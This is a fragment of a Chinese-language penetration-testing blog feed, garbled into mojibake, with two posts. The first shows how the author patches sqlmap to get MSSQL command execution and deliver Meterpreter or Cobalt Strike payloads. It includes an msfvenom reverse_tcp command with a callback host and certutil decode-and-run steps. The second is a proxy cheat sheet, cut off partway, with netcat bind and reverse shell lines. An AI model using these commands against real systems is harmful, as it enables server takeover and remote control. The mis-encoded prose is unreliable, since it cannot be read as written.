<li>æŸ¥çœ‹æºä»£ç ï¼Œä¿®æ”¹<code>/sqlmap/1.4.4/libexec/lib/request/inject.py</code>æ–‡ä»¶<code>goStacked</code>å‡½æ•°æœ€åä¸€è¡Œï¼Œè¾“å‡ºsqlmapæœ€ç»ˆæ‰§è¡Œçš„payloadå¹¶æµ‹è¯•è¯¥paylaodç›´æ¥åœ¨æ•°æ®åº“æ‰§è¡Œæ—¶çŠ¶æ€ã€‚ç»“æœå‘ç°ï¼Œæ•°æ®åº“æ‰§è¡Œçš„è¯­å¥ã€‚å‘ç°æŠ¥é”™äº†ï¼Œæ— æ³•æ’å…¥æ•°æ®ï¼Œå› ä¸ºåˆ—ä¸å…è®¸æœ‰ç©ºå€¼ã€‚(â€“os-shellæ—¶å€™ä¼šåˆ›å»ºè¡¨sqlmapoutput,è¯¥è¡¨æœ‰ä¸¤ä¸ªå­—æ®µid, data)</li>
</ul>
<p><img src="/posts/6e52a8fb/008.png" alt="image-20200428154223773"></p>
<p><img src="/posts/6e52a8fb/009.png" alt="image-20200428202433980"></p>
<ul>
<li>æŸ¥çœ‹è¡¨sqlmapoutput,å‘ç°å­—æ®µä¸å…è®¸ä¸ºç©ºã€‚</li>
</ul>
<p><img src="/posts/6e52a8fb/010.png" alt="image-20200428202953629"></p>
<p>ä»”ç»†è§‚å¯Ÿä¸Šé¢æµ‹è¯•ï¼Œä¼šå‘ç°é—®é¢˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šsqlmapåˆ›å»ºçš„è¡¨å¡«å……å­—æ®µæ—¶ï¼Œå­—æ®µå†…å®¹ä¸å…è®¸ä¸ºç©ºã€‚</span><br><span class="line">-- ç¬¬äºŒä¸ªé—®é¢˜ï¼šå¤šè¯­å¥æŸ¥è¯¢æ—¶ï¼Œè¿”å›ä¸¤æ¡ç»“æœï¼Œè€Œç¬¬äºŒæ¡ç»“æœåŒ…å«ä¸¤ä¸ªå­—æ®µå†…å®¹ã€‚</span><br><span class="line">--	æ¯”å¦‚ï¼š	</span><br><span class="line">		select name from admin where id &#x3D;1;EXEC master..xp_cmdshell whoami</span><br><span class="line">		ç»“æœï¼š</span><br><span class="line">          zhangsan</span><br><span class="line">          nt authority\system</span><br><span class="line">          NULL</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ˜¯ä¸æ˜¯è¿™æ ·å‘¢ï¼Ÿæµ‹è¯•ï¼šä¿®æ”¹sqlmapoutputè¡¨çš„dataå­—æ®µï¼Œå°†å…¶è®¾ç½®ä¸ºå…è®¸ä¸ºç©ºï¼š</p>
<p><img src="/posts/6e52a8fb/011.png" alt="image-20200428203700136"></p>
<p>å‘ç°æˆåŠŸå†™å…¥ã€‚ã€‚ã€‚</p>
<p>äºæ˜¯åˆ©ç”¨Sublimeå…¨å±€æœç´¢<code>CREATE TABLE</code>æ‰¾åˆ°MSSQLåˆ›å»ºè¡¨çš„è¯­å¥ï¼Œå°†å…¶è®¾ç½®ä¸ºå­—æ®µå…è®¸ä¸ºç©ºå³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/generic/misc.py    124è¡Œï¼Œåˆ›å»ºè¡¨æ—¶å­—æ®µåååŠ ä¸€ä¸ªNULL</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/012.png" alt="image-20200428203934381"></p>
<p>å†æ¥æµ‹è¯•ï¼š</p>
<p><img src="/posts/6e52a8fb/013.png" alt="image-20200428204410713"></p>
<p>åˆ°è¿™é‡Œå·²ç»å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œ<code>--os-shell</code>ç­‰ã€‚</p>
<h3 id="æ³¨å†Œè¡¨æ“ä½œåæ€"><a href="#æ³¨å†Œè¡¨æ“ä½œåæ€" class="headerlink" title="æ³¨å†Œè¡¨æ“ä½œåæ€"></a>æ³¨å†Œè¡¨æ“ä½œåæ€</h3><ul>
<li>æ ¹æ®<code>å‘½ä»¤æ‰§è¡Œåæ€</code>ï¼Œä¿®æ”¹ä¹‹åï¼Œå‘ç°è¯»å–æ³¨å†Œè¡¨æ—¶å€™æŠ¥é”™ã€‚</li>
</ul>
<p><img src="/posts/6e52a8fb/014.png" alt="image-20200430102205170"></p>
<ul>
<li>ç›´æ¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œä¼šå› è·¯å¾„ä¸­å­˜åœ¨ç©ºæ ¼è€ŒæŠ¥é”™ã€‚</li>
</ul>
<p><img src="/posts/6e52a8fb/015.png" alt="image-20200428114831755"></p>
<p>é‚£ä¹ˆè¿™é‡Œå°±æœ‰æ€è·¯äº†ï¼Œå°†payloadä¸Šä¼ åˆ°å…¶ä¸å«æœ‰ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦çš„æ–‡ä»¶å¤¹ã€‚(é¦–å…ˆå°è¯•PSå†™.bat,ä¸æˆåŠŸä½¿ç”¨VBï¼Œå› ä¸ºæˆ‘03æ²¡æœ‰PSï¼Œæ‰€ä»¥æ˜¯VB)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¿®æ”¹ä¸Šä¼ è·¯å¾„ï¼š</span></span><br><span class="line"><span class="comment">#	å…¨å±€æœç´¢å­—ç¬¦ä¸²ï¼š.bat</span></span><br><span class="line"><span class="comment">#	/sqlmap/1.4.4/libexec/lib/takeover/registry.py   27è¡Œ æ³¨é‡Šæ‰åŸæœ¬è¯­å¥ï¼Œæ”¹ä¸ºå¦‚ä¸‹</span></span><br><span class="line">        self._randStr = randomStr(lowercase=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># self._batPathRemote = &quot;\&quot;%s/tmpr%s.bat\&quot;&quot; % (conf.tmpPath, self._randStr)</span></span><br><span class="line">        self._batPathRemote = <span class="string">&quot;%s/tmpr%s.bat&quot;</span> % (<span class="string">&quot;C:/Windows&quot;</span>, self._randStr)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/016.png" alt="image-20200430105500903"></p>
<h3 id="è”åŠ¨MSFåæ€"><a href="#è”åŠ¨MSFåæ€" class="headerlink" title="è”åŠ¨MSFåæ€"></a>è”åŠ¨MSFåæ€</h3><p>é¦–å…ˆè·Ÿè¸ªä»£ç ï¼ŒæŸ¥çœ‹sqlmapè°ƒç”¨MSFè¿‡ç¨‹ï¼š</p>
<p><code>/Users/lnx/Desktop/1.4.4/libexec/plugins/generic/takeover.py</code>osPwnå‡½æ•°å¼€å§‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ç¬¬ä¸€æ­¥ï¼šé¦–å…ˆæµ‹è¯•xp_cmdshellæ˜¯å¦å¼€å¯</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒæ­¥ï¼š/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/generic/takeover.py osPwnå‡½æ•°è°ƒç”¨MSFç”ŸæˆRAWæ ¼å¼shellcode</span><br><span class="line">æ–‡ä»¶/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.pyä¸­å‡½æ•°createMsfShellcodeç”Ÿæˆshellcode</span><br><span class="line">/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=<span class="number">21453</span> LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.17</span> -a x86 -e x86/alpha_mixed -f raw BufferRegister=EAX &gt; <span class="string">&quot;/Users/lnx/.sqlmap/output/192.168.90.14/tmpmydff&quot;</span></span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰æ­¥ï¼šæ–‡ä»¶/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py <span class="number">617</span>è¡Œ å‡½æ•°createMsfShellcodeåˆä»¥å­—èŠ‚çš„æ ¼å¼è¯»å–ç”Ÿæˆçš„æ–‡ä»¶ã€‚</span><br><span class="line">        self._shellcodeFP = open(self._shellcodeFilePath, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        self.shellcodeString = getText(self._shellcodeFP.read())</span><br><span class="line">        self._shellcodeFP.close()</span><br><span class="line"></span><br><span class="line">ç¬¬å››æ­¥ï¼šä¸Šä¼ ï¼Œä¸Šä¼ åˆåˆ†ä¸ºä¸‰æ­¥</span><br><span class="line"><span class="number">1</span>ã€é¦–å…ˆæ˜¯è°ƒç”¨/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py å‡½æ•°uploadShellcodeexec</span><br><span class="line">å¤„ç†ï¼Œå¾—åˆ°æœ€ç»ˆä¸Šä¼ çš„payloadè·¯å¾„å’Œè®¡åˆ’ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„è·¯å¾„ï¼š</span><br><span class="line">/var/folders/xx/<span class="number">6j</span>y_czp97nl76bslj74817d40000gn/T/sqlmapCazl8M8626/tmpKjHjBr32_.exe(æœ€ç»ˆ)</span><br><span class="line">C:/Program Files/Microsoft SQL Server./mssql<span class="number">.1L</span>OG/tmpsecwjq.exe(ç›®æ ‡æœåŠ¡)</span><br><span class="line"><span class="number">2</span>ã€å‡½æ•°uploadShellcodeexecè°ƒç”¨/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/generic/filesystem.py å‡½æ•°writeFileå®ç°æ–‡ä»¶ä¸Šä¼ </span><br><span class="line"><span class="number">3</span>ã€å‡½æ•°writeFileè°ƒç”¨/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/dbms./mssqlserver/filesystem.py å‡½æ•°stackedWriteFile å°è¯•ä½¿ç”¨psã€vbsã€debugã€certutilè¿›è¡Œæ–‡ä»¶ä¸Šä¼ (æˆ‘è¿™é‡Œæ˜¯certutil)</span><br><span class="line"><span class="number">4</span>ã€å‡½æ•°stackedWriteFileåœ¨ä¸Šä¼ æ—¶è°ƒç”¨äº†å½“å‰æ–‡ä»¶å†…çš„å‡½æ•°_stackedWriteFileCertutilExeè¿›è¡Œä¸Šä¼ ã€‚</span><br><span class="line">	å‡½æ•°_stackedWriteFileCertutilExeï¼š</span><br><span class="line">    é¦–å…ˆè¯»å–ä¹‹å‰å¤„ç†å¥½çš„payload.exe(æœ€ç»ˆçš„exe)è¿›è¡ŒBase64ç¼–ç ;</span><br><span class="line">    ç„¶åå°†å…¶å†™å…¥åˆ°ç›®æ ‡æœºçš„txtæ–‡ä»¶ä¸­;</span><br><span class="line">    ä¹‹åè°ƒç”¨certutilè¿›è¡Œè§£ç txtæ–‡ä»¶è¾“å‡ºexeæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œ;</span><br><span class="line">    æœ€ååˆ é™¤txtæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/017.png" alt="image-20200430113607814"></p>
<p><img src="/posts/6e52a8fb/018.png" alt="image-20200430144626472"></p>
<p>è¿™é‡Œå°±æ˜¯æ— æ³•æ”¶åˆ°MSFåå¼¹ï¼Œç›´æ¥åœ¨CMDä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°ç”±äºè·¯å¾„ç©ºæ ¼é—®é¢˜æ— æ³•æˆåŠŸè§£ç æˆexeã€‚ã€‚ã€‚</p>
<p>ç»ˆäºæ‰¾åˆ°é—®é¢˜æ‰€åœ¨äº†ã€‚</p>
<p><img src="/posts/6e52a8fb/019.png" alt="image-20200429152426764"></p>
<p>é‚£ä¹ˆæ¥ä¿®æ”¹ä¸€ä¸‹ï¼Œç¬¬ä¸€ç§æ˜¯åˆ©ç”¨å¼•å·å°†è·¯å¾„æ‰©èµ·æ¥ï¼Œç¬¬äºŒç§æ˜¯ä¿®æ”¹æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ã€‚</p>
<p>è¿™é‡Œä½¿ç”¨ç¬¬ä¸€ç§ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py   376è¡Œï¼Œæ·»åŠ åŒå¼•å·</span></span><br><span class="line">       commands = ( </span><br><span class="line">            <span class="string">&quot;cd \&quot;%s\&quot;&quot;</span> % tmpPath,</span><br><span class="line">            <span class="string">&quot;certutil -f -decode %s \&quot;%s\&quot;&quot;</span> % (randFile, remoteFile),</span><br><span class="line">            <span class="string">&quot;del /F /Q %s&quot;</span> % randFile</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹sqlmapè§£ç payloadçš„å‚æ•°ï¼Œè®©å…¶æ­£ç¡®è¯†åˆ«è·¯å¾„å³å¯ã€‚</p>
<p><img src="/posts/6e52a8fb/020.png" alt="image-20200429153738090"></p>
<p>é‚£ä¹ˆå°è¯•åŠ è½½Cobalt Strikeå‘¢ï¼Ÿ</p>
<p>ç»è¿‡æµ‹è¯•ï¼ŒCSç”Ÿæˆçš„RAWæ ¼å¼shellcodeæ›¿æ¢æ‰sqlmapè°ƒç”¨MSFç”Ÿæˆçš„Rawæ ¼å¼(<code>/Users/lnx/Desktop/1.4.4/libexec/lib/takeover/metasploit.py</code>617è¡Œå·¦å³ã€‚)ï¼Œæ— æ³•æˆåŠŸåå¼¹ã€‚(æœªä»”ç»†åˆ†æç”Ÿæˆshellcodeå,sqlmapå¯¹å…¶å¤„ç†çš„é€»è¾‘ã€‚)</p>
<p>é‚£ä¹ˆç›´æ¥æ›¿æ¢æœ€ç»ˆä¸Šä¼ çš„exeæ–‡ä»¶ã€‚</p>
<ul>
<li>æ›¿æ¢exe,æœ‰å¿…è¦çš„è¯å¯ä»¥ç›´æ¥inputï¼Œæ¥å—è¾“å…¥ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ–‡ä»¶/sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py 393è¡Œå·¦å³ï¼Œè¯»æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># å°†localFileæ›¿æ¢æˆCSçš„exeé©¬ï¼Œå³å¯ï¼Œæˆ‘è¿™é‡Œæ˜¯é»˜è®¤çš„ï¼Œæ²¡æœ‰æŒ‡å®šx64,æŒ‡å®šäº†x64ä¸ä¸Šçº¿ã€‚ã€‚</span></span><br><span class="line">	      <span class="comment"># localFile = &quot;/Users/lnx/Desktop/test.exe&quot;</span></span><br><span class="line">        <span class="keyword">with</span> open(localFile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            localFileContent = f.read()</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/021.png" alt="image-20200430154114803"></p>
<p>è¿™é‡Œæ€è·¯å·²ç»ç»™å‡ºï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹sqlmapä»£ç ï¼Œå°†payloadæ”¹æˆä¸Šä¼ powershellæˆ–åˆ™å…¶ä»–ç±»å‹payload,ä»¥ä»¥é€‚ç”¨äºé«˜ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿã€‚</p>
<h3 id="å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåæ€"><a href="#å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåæ€" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåæ€"></a>å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåæ€</h3><p>å‚æ•°ï¼š-<code>-os-bof</code></p>
<p>åªé’ˆå¯¹03 çš„ï¼Œä¸è¿‡æˆ‘è¿™é‡Œä¸€æ¬¡éƒ½æ²¡æˆåŠŸã€‚<code>/sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/takeover.py</code>æ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°å…·ä½“çš„ä»£ç ã€‚</p>
<ul>
<li>é¦–å…ˆè°ƒç”¨msfvenomç”ŸæˆRawæ ¼å¼payloadç„¶å<code>/Users/lnx/Desktop/1.4.4/libexec/lib/takeover/metasploit.py</code>å†617è¡Œï¼Œä»¥<code>rb</code>è¯»å–å¾—åˆ°<code>shellcodestring</code>ã€‚</li>
<li>å†ç»è¿‡<code>/Users/lnx/Desktop/1.4.4/libexec/plugins/dbms./mssqlserver/takeover.py</code>70è¡Œå‰åä»£ç å¤„ç†å¾—åˆ°æœ€ç»ˆçš„ä»£ç ã€‚ã€‚ã€‚ç„¶åå‘é€å¸¦æœ‰Payloadçš„HTTPè¯·æ±‚ã€‚ã€‚ã€‚(è¿™é‡Œä¸é™„å½•payload,å¤ªé•¿äº†ï¼Œå¯ä»¥å»æ”¹æ–‡ä»¶è¾“å‡ºï¼Œçœ‹ä¸€ä¸‹ã€‚)</li>
</ul>
<p>è¿™é‡Œå¤åˆ¶æœ€ç»ˆçš„ä»£ç ï¼Œç›´æ¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œï¼Œå‘ç°æœåŠ¡å™¨å †æ ˆæº¢å‡ºã€‚ã€‚ã€‚ã€‚ã€‚æ²¡æœ‰æ¥å—åˆ°åå¼¹ã€‚ã€‚</p>
<p><img src="/posts/6e52a8fb/022.png" alt="image-20200429163323085"></p>
<p>å› ä¸ºèœï¼Œæš‚æœªæ‰¾åˆ°å¥½åŠæ³•ã€‚ã€‚ã€‚</p>
<h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>ç»è¿‡ä»¥ä¸Šæµ‹è¯•ï¼Œè¿˜æ˜¯æœ‰ç‚¹æ”¶è·çš„ï¼Œæ¯•ç«Ÿèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤äº†ï¼Œè€Œä¸”çŸ¥é“äº†sqlmapæ— æ³•é€šè¿‡MSSQLæ‰§è¡Œçš„åŸå› ä»¥åŠä¿®å¤æ–¹å¼ã€‚</p>
<h3 id="å‘½ä»¤æ‰§è¡Œâ€“os-shell"><a href="#å‘½ä»¤æ‰§è¡Œâ€“os-shell" class="headerlink" title="å‘½ä»¤æ‰§è¡Œâ€“os-shell"></a>å‘½ä»¤æ‰§è¡Œâ€“os-shell</h3><p><strong>æˆå› ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šsqlmapåˆ›å»ºçš„è¡¨å¡«å……å­—æ®µæ—¶ï¼Œå­—æ®µå†…å®¹ä¸å…è®¸ä¸ºç©ºã€‚</span><br><span class="line">ç¬¬äºŒä¸ªé—®é¢˜ï¼šå¤šè¯­å¥æŸ¥è¯¢æ—¶ï¼Œè¿”å›ä¸¤æ¡ç»“æœï¼Œè€Œç¬¬äºŒæ¡ç»“æœåŒ…å«ä¸¤ä¸ªå­—æ®µå†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®å¤ï¼š</strong></p>
<p>ä¿®æ”¹æ‰€æœ‰å…³äºMSSQLåˆ›å»ºè¡¨æ—¶å­—æ®µå±æ€§ï¼Œæ·»åŠ <code>NULL</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/generic/misc.py    124è¡Œï¼Œåˆ›å»ºè¡¨æ—¶å­—æ®µåååŠ ä¸€ä¸ªNULL</span></span><br><span class="line"><span class="comment"># å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createSupportTbl</span>(<span class="params">self, tblName, tblField, tblType</span>):</span></span><br><span class="line">        inject.goStacked(<span class="string">&quot;DROP TABLE %s&quot;</span> % tblName, silent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Backend.isDbms(DBMS.MSSQL) <span class="keyword">and</span> tblName == self.cmdTblName:</span><br><span class="line">            inject.goStacked(<span class="string">&quot;CREATE TABLE %s(id INT PRIMARY KEY IDENTITY, %s %s NULL)&quot;</span> % (tblName, tblField, tblType))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inject.goStacked(<span class="string">&quot;CREATE TABLE %s(%s %s)&quot;</span> % (tblName, tblField, tblType))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py  96è¡Œ</span></span><br><span class="line">self.createSupportTbl(txtTbl, self.tblField, <span class="string">&quot;text&quot;</span>)</span><br><span class="line">        inject.goStacked(<span class="string">&quot;DROP TABLE %s&quot;</span> % hexTbl)</span><br><span class="line">        inject.goStacked(<span class="string">&quot;CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s NULL)&quot;</span> % (hexTbl, self.tblField, <span class="string">&quot;VARCHAR(4096)&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="æ³¨å†Œè¡¨-â€“reg"><a href="#æ³¨å†Œè¡¨-â€“reg" class="headerlink" title="æ³¨å†Œè¡¨ â€“reg-[]"></a>æ³¨å†Œè¡¨ â€“reg-[]</h3><p><strong>æˆå› ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmapæ— æ³•è¯»å–æ³¨å†Œè¡¨æ˜¯å› ä¸ºè·¯å¾„ä¸­åŒ…å«ç©ºæ ¼ï¼Œå¯¼è‡´å‚æ•°è¢«æˆªæ–­ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®å¤:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¿®æ”¹ä¸Šä¼ è·¯å¾„ï¼š</span></span><br><span class="line"><span class="comment">#	å…¨å±€æœç´¢å­—ç¬¦ä¸²ï¼š.bat</span></span><br><span class="line"><span class="comment">#	/sqlmap/1.4.4/libexec/lib/takeover/registry.py   27è¡Œ æ³¨é‡Šæ‰åŸæœ¬è¯­å¥ï¼Œæ”¹ä¸ºå¦‚ä¸‹</span></span><br><span class="line">        self._randStr = randomStr(lowercase=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># self._batPathRemote = &quot;\&quot;%s/tmpr%s.bat\&quot;&quot; % (conf.tmpPath, self._randStr)</span></span><br><span class="line">        self._batPathRemote = <span class="string">&quot;%s/tmpr%s.bat&quot;</span> % (<span class="string">&quot;C:/Windows&quot;</span>, self._randStr)</span><br></pre></td></tr></table></figure>

<h3 id="MSF-amp-CSè”åŠ¨"><a href="#MSF-amp-CSè”åŠ¨" class="headerlink" title="MSF&amp;CSè”åŠ¨"></a>MSF&amp;CSè”åŠ¨</h3><p><strong>æˆå› ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloadæˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯è§£ç æ—¶å€™ï¼Œè·¯å¾„å‡ºç°ç©ºæ ¼æˆªæ–­ï¼Œå¯¼è‡´å‘½ä»¤é”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®å¤ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py   376è¡Œï¼Œæ·»åŠ åŒå¼•å·</span></span><br><span class="line">       commands = ( </span><br><span class="line">            <span class="string">&quot;cd \&quot;%s\&quot;&quot;</span> % tmpPath,</span><br><span class="line">            <span class="string">&quot;certutil -f -decode %s \&quot;%s\&quot;&quot;</span> % (randFile, remoteFile),</span><br><span class="line">            <span class="string">&quot;del /F /Q %s&quot;</span> % randFile</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>MSSQL</tag>
        <tag>SQLMap</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨Proxyå°ç»“</title>
    <url>/posts/8949441d/</url>
    <content><![CDATA[<p>åœ¨ç”¨çš„å†…ç½‘ä»£ç†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<a id="more"></a>

<h1 id="ä»£ç†å°ç»“"><a href="#ä»£ç†å°ç»“" class="headerlink" title="ä»£ç†å°ç»“"></a>ä»£ç†å°ç»“</h1><p>å…ˆå†™è¿™ä¹ˆå¤š- - - - - - â€“ </p>
<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkLzMuMC4yL0Jsb29kSG91bmQtd2luMzIteDY0LnppcA==">https://github.com/BloodHoundAD/BloodHound/releases/download/3.0.2/BloodHound-win32-x64.zip<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å…è´¹å·¥å…·ã€‚</p>
<p>é€šè¿‡å›¾å½¢åŒ–æ–¹å¼å°†åŸŸå†…èµ„æºç›´è§‚çš„å±•ç¤ºï¼Œæ›´å¥½çš„åˆ†æåŸŸå†…æƒ…å†µã€‚ä»¥ä¾¿äºæ›´å¿«çš„æ‰¾åˆ°å¼±ç‚¹ã€‚</p>
<h4 id="å®‰è£…é…ç½®"><a href="#å®‰è£…é…ç½®" class="headerlink" title="å®‰è£…é…ç½®"></a>å®‰è£…é…ç½®</h4><ul>
<li>Javaç¯å¢ƒ</li>
<li>Neo4jæ•°æ®åº“</li>
</ul>
<p>é…å¥—åŸŸå†…ä¿¡æ¯æœé›†å·¥å…·<span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL21hc3Rlci9Jbmdlc3RvcnMvU2hhcnBIb3VuZC5leGU=">https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.exe<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="ä»£ç†å·¥å…·"><a href="#ä»£ç†å·¥å…·" class="headerlink" title="ä»£ç†å·¥å…·"></a>ä»£ç†å·¥å…·</h2><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><p>åœ¨LinuxNCï¼Œå¼¹å›shellä¸”æ— æ³•åˆ‡åˆ°bashæ—¶å€™ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="å¸¸ç”¨è¯­æ³•"><a href="#å¸¸ç”¨è¯­æ³•" class="headerlink" title="å¸¸ç”¨è¯­æ³•"></a>å¸¸ç”¨è¯­æ³•</h4><ul>
<li>ç«¯å£æ‰«æ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -v ip port</span><br><span class="line">nc -v -z ip 1-1024</span><br></pre></td></tr></table></figure>

<ul>
<li>ç«¯å£ç›‘å¬</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lpvv 9999</span><br><span class="line">å®¢æˆ·ç«¯è¿æ¥ï¼šnc -nvv ip port</span><br></pre></td></tr></table></figure>

<ul>
<li>æ–‡ä»¶ä¼ è¾“</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -vn ip port &lt; text.txt -q 1				# ä¸ç›®æ ‡IPå»ºç«‹è¿æ¥å¹¶ä¼ è¾“ç»™IPä¸€ä¸ªæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<ul>
<li>æ­£å‘shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡ç«¯</span></span><br><span class="line">nc -lpvv port -e /bin/bash</span><br><span class="line">nc -lpvv port -e c:\windows\system32\cmd.exe</span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯</span></span><br><span class="line">nc ip port </span><br></pre></td></tr></table></figure>

<ul>
<li>åå‘è¿æ¥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡ç«¯</span></span><br><span class="line">nc -lvvp port</span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯</span></span><br><span class="line">nc ip port -e /bin/bash</span><br><span class="line">nc ip port -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="å…¶ä»–è¯­è¨€è¿æ¥NC"><a href="#å…¶ä»–è¯­è¨€è¿æ¥NC" class="headerlink" title="å…¶ä»–è¯­è¨€è¿æ¥NC"></a>å…¶ä»–è¯­è¨€è¿æ¥NC</h4><ul>
<li>python</li>
</ul>
